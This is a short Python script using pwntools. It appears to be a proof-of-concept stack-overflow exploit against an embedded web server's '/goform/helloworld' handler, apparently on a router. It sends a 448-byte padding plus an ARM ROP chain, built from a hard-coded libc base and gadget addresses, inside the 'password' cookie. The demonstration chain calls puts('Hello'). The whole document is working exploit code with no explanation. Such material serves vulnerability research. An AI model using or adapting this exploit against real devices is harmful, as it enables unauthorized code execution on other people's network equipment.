import requests
from pwn import *
 
base = 0xff5d5000
libc = ELF('./lib/libc.so.0')
 
puts = base+libc.sym['puts']
_str = "Hello\x00"
mov_r0 = base+0x00040cb8 # mov r0, sp; blx r3;
pop_r3 = base+0x00018298 # pop {r3, pc};
URL = "http://192.168.14.132:80/goform/helloworld"
pl = 'a'*448+p32(pop_r3)+p32(puts)+p32(mov_r0)+_str
cookie = {"Cookie":"password="+pl+".png"}
requests.get(url=URL, cookies=cookie)
